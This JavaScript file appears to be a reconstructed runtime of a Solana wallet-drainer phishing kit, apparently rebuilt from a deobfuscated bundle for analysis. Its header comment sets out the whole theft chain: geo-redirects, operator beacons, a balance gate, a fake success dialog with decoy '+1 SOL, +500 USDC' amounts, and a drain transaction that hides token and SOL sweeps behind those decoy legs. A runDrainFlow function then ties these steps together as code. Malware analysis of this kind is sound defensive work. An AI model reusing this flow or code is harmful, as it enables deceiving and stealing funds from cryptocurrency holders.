/**
 * rebuilt/page/runtime.js
 *
 * Full kit runtime — the complete drain flow from page load to funds stolen.
 * This is the master file that ties every component together.
 *
 * Sources:
 *   - bundle.deobfuscated.js lines 33381–34134 (main entrypoint 籨, 歅 class, event loop)
 *   - DRAIN_PIPELINE.md (kill chain narrative)
 *   - decompiled/live/RUNTIME_MAP.md (observed request sequences)
 *   - decompiled/live/dynamic/captured_tx_2026-11-12.json
 *   - GAP_CLOSURE_2026-11-14.md (confirmed sequence details)
 *
 * ═══════════════════════════════════════════════════════════════════
 *  COMPLETE KILL CHAIN (every step, confirmed by dynamic analysis)
 * ═══════════════════════════════════════════════════════════════════
 *
 * Phase 1 — Page Load
 * ───────────────────
 *  1. window.addEventListener("load", main)
 *     main = 籨(config_object, tgWebAppUser)
 *
 *  2. Russian/Ukrainian redirect (邞):
 *     if navigator.language.startsWith("ru") or contains "-ru" at index 3:
 *       window.location.replace("https://solana.com/")  ← ABORT
 *
 *  3. sendVisit(config, tgUser):
 *     POST /api/visit?source={utm_source}&origin={pageHost}&tgid={id}&tgus={username}
 *     Skipped if URL contains "?b=" (connect domain arrival).
 *     Skipped for 900 s after a successful "ok" response (cached in localStorage["_0x5"]).
 *
 *  4. isBanned(apiHost):
 *     GET /api/is-banned
 *     → "1": redirect to solana.com ← ABORT
 *     → "0": continue
 *
 *  5. fetchConfig(apiHost, tgid):   ← NEW: tgid param confirmed by deobfuscation
 *     GET /api/config?tgid={N}
 *     AES-GCM decrypt (key = SHA-256(apiHost + salt))
 *     Parse binary struct → config object
 *     Cache raw ciphertext to localStorage["_0x12"]
 *     If Yr & 1 →邞() redirect ← ABORT
 *     Retry with backoff (ho() method): 250ms * attempt, up to 10 retries
 *
 *  6. kit sets state.K = config.maxSol * 1_000_000_000
 *     (the SOL amount used in /c/i payload and balance gate)
 *
 * Phase 2 — Wallet Connection
 * ───────────────────────────
 *  7. User clicks "Connect Wallet" → openModal() → AppKit Web3Modal
 *
 *  8. On desktop: openConnectPopup(connectDomain, generateConnectToken(pageHost))
 *     → window.open("https://" + connectDomain + "/connect/" + token + "?b=1", ...)
 *     Popup: 360×450, top quarter of screen.
 *     Connect domain runs the same bundle but in embedded mode (window.embedded=true).
 *
 *     On mobile: embedded flow (no popup), wallet deep-links constructed per wallet.
 *
 *  9. Victim selects wallet (Phantom, Solflare, Backpack, etc.)
 *
 *  10. Balance gate: checkWallet(victimPubkey, minLamports)
 *      GET /api/is-banned (again, now with wallet address in state)
 *      Solflare getAccountInfo (checks owner === SystemProgram, reads lamports)
 *      If exclusion set → "target account" error ← ABORT
 *      If !SystemProgram → "Watch Address" error ← ABORT
 *      If lamports < threshold → "insufficient balance" screen ← ABORT
 *
 *  11. Portfolio scan: portfolio(victimPubkey) via Solflare API
 *      → lists all SPL and Token-2022 token accounts
 *      + getStakeAccounts(victimPubkey) → native stake positions
 *      Tokens sorted by USD value (highest value drained first).
 *
 * Phase 3 — Pre-Drain Telemetry
 * ─────────────────────────────
 *  12. sendHandlerEvent(EVENT_KIND.CONNECT, ...):
 *      POST /api/handler (AES-GCM, key = SHA-256(apiHost + "log" + salt))
 *      Sends: kit version, Telegram ID, wallet name, victim pubkey,
 *             SOL amount, token list.
 *
 *  13. notifyConnect(apiHost, victimPubkey, state.K, accountList):
 *      POST /api/c/i (AES-GCM encrypted payload)
 *      Server responds with:
 *        → sessionId
 *        → optional decoy config (which amounts to show in fake dialog)
 *        → flowModifier (determines FLOW type for this drain attempt)
 *
 * Phase 4 — Fake Confirmation Dialog
 * ────────────────────────────────────
 *  14. Kit renders its OWN confirmation dialog (NOT the wallet's):
 *      "Success! Transaction was successfully performed"
 *      Shows DECOY amounts: "+1 SOL, +500 USDC" (the fake incoming legs).
 *      Streams /_nuxt/media/refund.webm as social proof video.
 *      Phantom-spoof copy from PHANTOM_SPOOF table injected into UI.
 *      "Abuse Protection" notice for the SIWS verify step.
 *
 *  15. sendHandlerEvent(EVENT_KIND.PRE_SIGN, ...) — once per session.
 *
 * Phase 5 — Transaction Signing
 * ──────────────────────────────
 *  16. Victim clicks "Confirm" in the fake dialog.
 *
 *  17. notifyConfirm(apiHost, sessionId, counter):
 *      POST /api/c/c/{sessionId}/{counter}  body: {}
 *
 *  18. Build drain transaction:
 *      assembleMainDrainTx({ victimPubkey, tokens, config, campaignTag, ... })
 *      Instructions:
 *        [0] ComputeBudget.SetComputeUnitLimit(totalCU)
 *        [1] ComputeBudget.SetComputeUnitPrice(microlamports)
 *        [2] OPERATOR_PROGRAM disc 0x00 — marker (ASCII campaign tag, e.g. "1kd1mz4r-|1|")
 *        [3+] OPERATOR_PROGRAM disc 0x02 — token sweeps (one per token)
 *        [N] SystemProgram.Transfer — DECOY: treasury→victim 1 SOL (+1 SOL preview)
 *        [N+1] ATA.CreateIdempotent — SETUP: victim's USDC ATA if needed
 *        [N+2] Token.Transfer — DECOY: relay→victim 500 USDC (+500 USDC preview)
 *        [N+3] OPERATOR_PROGRAM disc 0x15 args [0x02, affiliatePct] — SOL THEFT
 *
 *  19. wallet.signTransaction(drainTx)  ← VICTIM SIGNS
 *      Wallet shows preview: "+1 SOL incoming, +500 USDC incoming"
 *      (The actual drain is hidden in the operator program CPI)
 *
 *  20. sendHandlerEvent(EVENT_KIND.SIGN, ...)
 *
 * Phase 6 — Submit & Collect
 * ───────────────────────────
 *  21. submitProcess(apiHost, victimPubkey, attemptCounter, [signedTx], flowByte, accounts):
 *      POST /api/process  (base64 binary payload)
 *      Server:
 *        a. Receives victim's partial signature
 *        b. Adds treasury signature (DvTqmF7u = fee payer)
 *        c. Adds receiver signature (from /api/config live receivers)
 *        d. Submits fully-signed tx to Solana mainnet via its own RPC
 *
 *  22. After 2500 ms: broadcastSigned([signedTx]) via kit's own 8-endpoint RPC
 *      (sendTransaction with skipPreflight: true)
 *      This is the fallback if the operator's submit failed.
 *
 *  23. Solana executes atomically:
 *        - marker ix:  writes campaign tag on-chain permanently (affiliate ledger)
 *        - token ixs:  operator program CPI moves victim's tokens to drain-through
 *        - treasury ix: 1 SOL "incoming" (net zero — treasury also takes via drain)
 *        - USDC ix:    500 USDC "incoming" (net zero — relay is operator-controlled)
 *        - disc 0x15:  splits victim's SOL: X% to per-campaign receiver, (100-X)% to collector
 *      Net result: ALL victim assets moved to operator-controlled addresses.
 *      Victim sees "+1 SOL, +500 USDC" arrive while losing everything.
 *
 *  24. notifyFinal(apiHost, sessionId, accountList):
 *      POST /api/c/f/{sessionId}  (packed account list)
 *
 *  25. sendHandlerEvent(EVENT_KIND.COMPLETE, ...)
 *
 * ═══════════════════════════════════════════════════════════════════
 *  ALTERNATIVE FLOWS
 * ═══════════════════════════════════════════════════════════════════
 *
 * FLOW.SIWS (flow type 1) — "verify ownership":
 *   After the fake Confirm dialog, instead of signTransaction, the kit
 *   calls wallet.signMessage(SIWS_message). The signed message is sent
 *   to /api/process. Server uses it as an authentication proof that the
 *   victim controls the wallet. Shown copy: "Abuse Protection" [PHANTOM_COPY.abuse].
 *   Retry message: getString(1043) "Please allow one more verification step".
 *   After SIWS succeeds, the kit continues to the token drain (reverts to FLOW.DRAIN).
 *
 * FLOW.SPAM (flow type 2) — "200-tx flood":
 *   Kit builds up to 201 near-empty transactions (assembleDummyTxs).
 *   Shows /_nuxt/media/200tx.webm video alongside the mass-sign prompt.
 *   "Transactions are reverted" copy [444] displayed.
 *   Victim clicks through all 200 signatures, with the real drain hiding
 *   among them (one of the 200+ txs is the actual drain tx).
 *
 * Blockhash expiry re-sign (slot > lastValidBlockHeight):
 *   If the slot passes lastValidBlockHeight (432,000 slot window),
 *   the kit fetches a fresh blockhash and shows:
 *   getString(1042) "Please sign it one more time to continue."
 */

'use strict';

// This file is primarily documentary — the full flow narrative above.
// Executable stubs below tie the components together as they exist in the kit.

const { createSession, FLOW, ERR, VIDEO } = require('../core/state');
const { fetchConfig, isBanned, sendVisit }   = require('./visit_and_init');
const { checkWallet }   = require('./balance_gate');
const { notifyConnect, submitProcess, notifyConfirm, notifyFinal } = require('../operator/client');
const { sendHandlerEvent, EVENT_KIND } = require('../operator/telemetry');
const { assembleMainDrainTx, assembleDummyTxs } = require('../chain/tx_builders');

/**
 * runDrainFlow(config, tgUser):
 *   Top-level async drain orchestrator.
 *   Called from window.addEventListener("load", ...) → 籨(config, tgUser)
 *
 *   config: parsed config object from /api/config
 *   tgUser: Telegram WebApp user object { id, username } or null
 */
async function runDrainFlow(config, tgUser) {
  const session = createSession(config.apiHost);
  session.K = config.maxSol * 1_000_000_000; // SOL amount in lamports

  // Phase 1: redirect RU/UK browsers
  if (shouldRedirectRu(config) || isRuLanguage()) {
    window.location.replace('https://solana.com/');
    return;
  }

  // Phase 1: visit beacon
  await sendVisit(config.apiHost, tgUser).catch(() => {});

  // Phase 1: ban check
  if (await isBanned(config.apiHost).catch(() => false)) {
    window.location.replace('https://solana.com/');
    return;
  }

  // Phase 2: wallet connection (handled by AppKit / Web3Modal)
  // openModal() is called by the lure HTML button click handler
  // We wait for a wallet-connected event from AppKit

  // ... (AppKit event: wallet connected, victimPubkey known) ...

  // Phase 2: balance gate
  const gate = await checkWallet(session.b?.e, session.K);
  if (!gate.ok) {
    showError(gate.message);
    return;
  }

  // Phase 2: portfolio scan
  const portfolio = await scanPortfolio(session.b.e);

  // Phase 3: pre-drain telemetry
  await sendHandlerEvent({
    kind:   EVENT_KIND.CONNECT,
    wallet: session.b.name,
    pubkey: decodeBase58(session.b.e),
    ve:     gate.lamports / 1_000_000_000,
    Me:     portfolio.tokens.map(t => t.account),
    un:     navigator.language.slice(0, 5),
  }, config.apiHost).catch(() => {});

  // Phase 3: connect notification
  const [sessionId, keyedEntry, flowModifier] = await notifyConnect(
    config.apiHost, session.b.e, session.K, buildAccountList(portfolio)
  );
  session.sessionId   = sessionId;
  session.he          = { be: flowModifier || FLOW.DRAIN, ie: false };

  // Phase 4: show fake confirmation dialog
  showFakeConfirmDialog(portfolio, config);

  // Phase 4: pre-sign telemetry (once)
  await sendHandlerEvent({ kind: EVENT_KIND.PRE_SIGN, ...baseEvent(session) }, config.apiHost).catch(() => {});

  // Phase 5: victim clicks Confirm
  await notifyConfirm(config.apiHost, sessionId, 0);

  // Phase 5: build drain transaction
  const instructions = assembleMainDrainTx({
    victimPubkey:  session.b.e,
    tokens:        portfolio.tokens,
    config,
    campaignTag:   getCampaignTag(),
    affiliatePct:  0x50, // 80% default
  });

  // Phase 5: sign (via wallet adapter)
  const signedTx = await session.b.signTransaction(buildVersionedTx(instructions));

  await sendHandlerEvent({ kind: EVENT_KIND.SIGN, ...baseEvent(session) }, config.apiHost).catch(() => {});

  // Phase 6: submit to operator
  session.ne++;
  await submitProcess(
    config.apiHost,
    session.b.e,
    session.ne,
    [signedTx],
    session.he.be,
    portfolio.tokens.map(t => t.account),
  );

  // Phase 6: 2500ms self-broadcast fallback (in submit.js)
  setTimeout(() => broadcastSigned([signedTx]), 2500);

  // Phase 6: final notification
  await notifyFinal(config.apiHost, sessionId, portfolio.tokens.map(t => decodeBase58(t.account)));

  await sendHandlerEvent({ kind: EVENT_KIND.COMPLETE, ...baseEvent(session) }, config.apiHost).catch(() => {});
}

function isRuLanguage() {
  const lang = navigator.language.toLowerCase();
  return lang.indexOf('ru') === 0 || lang.indexOf('ru') === 3;
}

function baseEvent(session) {
  return {
    version: '1.18.4',
    wallet:  session.b?.name,
    pubkey:  decodeBase58(session.b?.e || ''),
    ve:      (session.K || 0) / 1_000_000_000,
    un:      navigator.language.slice(0, 5),
  };
}

// (showError, showFakeConfirmDialog, buildAccountList, getCampaignTag,
//  buildVersionedTx, broadcastSigned, scanPortfolio, decodeBase58
//  are implemented in their respective modules)

module.exports = { runDrainFlow };
